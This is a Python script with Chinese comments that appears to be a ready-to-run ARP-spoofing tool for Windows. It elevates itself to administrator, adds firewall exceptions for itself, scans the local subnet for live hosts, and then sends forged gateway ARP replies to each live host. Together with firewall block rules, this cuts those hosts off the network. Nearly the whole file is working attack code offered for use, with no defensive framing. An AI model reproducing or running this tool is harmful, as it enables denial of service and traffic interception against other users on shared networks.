import os
import sys
import ctypes
import subprocess
import ipaddress
import time
import threading
import uuid
import logging
from concurrent.futures import ThreadPoolExecutor
from scapy.all import ARP, Ether, sendp, srp, conf
import netifaces

# 日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, ' '.join(sys.argv), None, 1
            )
        except:
            return False
        return True
    return False

if not is_admin():
    if run_as_admin():
        sys.exit(0)
    else:
        logging.error("未能以管理员权限运行脚本。")
        sys.exit(1)

def add_firewall_exception():
    try:
        script_path = os.path.abspath(__file__)
        subprocess.call(f'netsh advfirewall firewall add rule name="Allow Python Script" dir=in action=allow program="{script_path}" enable=yes', shell=True)
        subprocess.call(f'netsh advfirewall firewall add rule name="Allow Python Script" dir=out action=allow program="{script_path}" enable=yes', shell=True)
        logging.info("已为脚本添加防火墙例外")
    except Exception as e:
        logging.error(f"添加防火墙例外时出错: {e}")

def get_host_and_gateway_ip():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        interfaces = netifaces.interfaces()

        host_ip = None
        for interface in interfaces:
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                iface_ip = addrs[netifaces.AF_INET][0]['addr']
                if iface_ip.startswith("192.168") or iface_ip.startswith("10.") or iface_ip.startswith("172."):
                    host_ip = iface_ip
                    break

        if host_ip and default_gateway:
            logging.info(f"本机IP地址: {host_ip}, 网关IP地址: {default_gateway}")
            return host_ip, default_gateway
    except Exception as e:
        logging.error(f"获取IP地址时出错: {e}")
    return None, None

def get_mac_address():
    node = uuid.getnode()
    mac = uuid.UUID(int=node).hex[-12:]
    mac = ':'.join(mac[i:i+2] for i in range(0, len(mac), 2))
    return mac.upper()

def get_local_network(gateway_ip):
    network = ipaddress.ip_network(gateway_ip + '/24', strict=False)
    return network

def create_ip_file(network, host_ip, gateway_ip):
    with open('ip.txt', 'w') as f:
        for ip in network:
            if str(ip) != host_ip and str(ip) != gateway_ip:
                f.write(str(ip) + '\n')

def send_arp_request(ip, interface):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, iface=interface, timeout=5, verbose=False)[0]
    return answered_list

def check_ip(ip, interface):
    mac_address = None
    for _ in range(4):  # 尝试发送4次ARP请求
        answered_list = send_arp_request(ip, interface)
        if answered_list:
            mac_address = answered_list[0][1].hwsrc
            break
        time.sleep(1.25)  # 每次等待1.25秒，总计5秒

    if mac_address:
        logging.info(f"{ip} 处于活动状态，MAC地址: {mac_address}")
        return f"{ip} {mac_address}"
    else:
        logging.info(f"{ip} 没有响应ARP请求")
    return None

def get_mac_from_arp(ip):
    try:
        output = subprocess.check_output(f'arp -a {ip}', shell=True).decode('utf-8', errors='ignore')
        for line in output.split('\n'):
            if ip in line:
                parts = line.split()
                if len(parts) > 1:
                    mac_address = parts[1]
                    if "-" in mac_address:
                        mac_address = mac_address.replace("-", ":")
                    return mac_address
    except subprocess.CalledProcessError:
        pass
    return None

def add_firewall_rule(ip):
    # 添加防火墙规则，阻止所有入站和出站流量
    subprocess.call(f'netsh advfirewall firewall add rule name="Block {ip} Inbound" dir=in action=block remoteip={ip} protocol=any', shell=True)
    subprocess.call(f'netsh advfirewall firewall add rule name="Block {ip} Outbound" dir=out action=block remoteip={ip} protocol=any', shell=True)
    logging.info(f"已添加防火墙规则阻止来自 {ip} 的所有流量")

def remove_firewall_rule(ip):
    subprocess.call(f'netsh advfirewall firewall delete rule name="Block {ip} Inbound"', shell=True)
    subprocess.call(f'netsh advfirewall firewall delete rule name="Block {ip} Outbound"', shell=True)
    logging.info(f"已删除防火墙规则阻止来自 {ip} 的所有流量")

class ArpSpoof(threading.Thread):
    def __init__(self, hacker_mac, target_ip, target_mac, gateway_ip):
        super().__init__()
        self.hacker_mac = hacker_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.stop_event = threading.Event()

    def run(self):
        while not self.stop_event.is_set():
            self.send_spoofed_arp()
            time.sleep(2)

    def send_spoofed_arp(self):
        # 欺骗目标设备
        arp_response = ARP(
            op=2,
            psrc=self.gateway_ip,
            hwsrc=self.hacker_mac,
            pdst=self.target_ip,
            hwdst=self.target_mac
        )
        sendp(Ether(dst=self.target_mac)/arp_response, verbose=False)
        logging.info(f"发送ARP欺骗包到 {self.target_ip} 作为 {self.gateway_ip} (MAC: {self.hacker_mac})")

    def stop(self):
        self.stop_event.set()

def start_arp_poisoning(gateway_ip, gateway_mac):
    with open('ip2.txt', 'r') as f:
        alive_ips = f.read().splitlines()

    spoofers = []
    for entry in alive_ips:
        parts = entry.split()
        if len(parts) == 2:
            target_ip = parts[0]
            target_mac = parts[1]
            spoofer = ArpSpoof(get_mac_address(), target_ip, target_mac, gateway_ip)
            spoofer.start()
            add_firewall_rule(target_ip)
            spoofers.append(spoofer)
            time.sleep(0.1)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        for spoofer in spoofers:
            spoofer.stop()
            remove_firewall_rule(spoofer.target_ip)

def main():
    try:
        add_firewall_exception()
        
        host_ip, gateway_ip = get_host_and_gateway_ip()
        if not host_ip or not gateway_ip:
            logging.error("未找到连接的网络适配器或无法获取IP地址")
            return
        
        gateway_mac = get_mac_from_arp(gateway_ip)
        if not gateway_mac:
            logging.error("无法获取网关MAC地址")
            return

        network = get_local_network(gateway_ip)
        create_ip_file(network, host_ip, gateway_ip)
        
        with open('ip.txt', 'r') as f:
            ips = f.read().splitlines()
        
        alive_ips = []
        interface = conf.iface

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_ip, ip, interface) for ip in ips]
            for future in futures:
                result = future.result()
                if result:
                    alive_ips.append(result)
        
        with open('ip2.txt', 'w') as f:
            for entry in alive_ips:
                f.write(entry + '\n')
        
        open('target.txt', 'w').close()
        
        logging.info("IP探测完成，进入ARP断网阶段")
        start_arp_poisoning(gateway_ip, gateway_mac)

    except Exception as e:
        logging.error(f"脚本运行时出错: {e}", exc_info=True)
        input("按回车键退出...")

if __name__ == '__main__':
    if os.path.exists('target.txt'):
        try:
            add_firewall_exception()
            
            host_ip, gateway_ip = get_host_and_gateway_ip()
            gateway_mac = get_mac_from_arp(gateway_ip)
            start_arp_poisoning(gateway_ip, gateway_mac)
        except Exception as e:
            logging.error(f"脚本运行时出错: {e}", exc_info=True)
            input("按回车键退出...")
    else:
        main()
        input("按回车键退出...")
